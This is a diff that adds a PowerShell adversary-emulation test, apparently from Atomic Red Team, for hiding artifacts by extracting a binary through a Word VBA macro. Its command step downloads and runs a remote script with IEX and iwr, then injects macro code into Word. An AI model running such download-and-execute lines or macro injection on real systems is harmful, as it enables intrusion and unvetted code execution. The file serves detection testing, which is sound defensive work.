@@ -1,0 +1,26 @@
+#TechniqueName: Hide Artifacts
+#AtomicTestName: Extract binary files via VBA
+#Language: ps1
+
+#get_prereq_commands
+Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+
+
+#prereq_commands
+try {
+  New-Object -COMObject "Word.Application" | Out-Null
+  Stop-Process -Name "winword"
+  exit 0
+} catch { exit 1 }
+
+
+#commands
+$macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
+
+
+#cleanup_commands
+Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
+
